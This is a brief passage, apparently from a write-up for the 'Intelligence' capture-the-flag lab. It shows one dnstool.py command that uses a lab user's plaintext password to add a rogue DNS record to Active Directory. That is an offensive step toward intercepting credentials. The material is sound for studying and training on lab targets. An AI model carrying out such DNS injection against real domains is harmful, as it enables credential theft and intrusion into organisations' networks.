## LDAP Exploitation

Use dnstool to add DNS entries for AD:
```
python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -a add -r 'weboops.intelligence.htb' -d <YOUR IP> <MACHINE IP>
```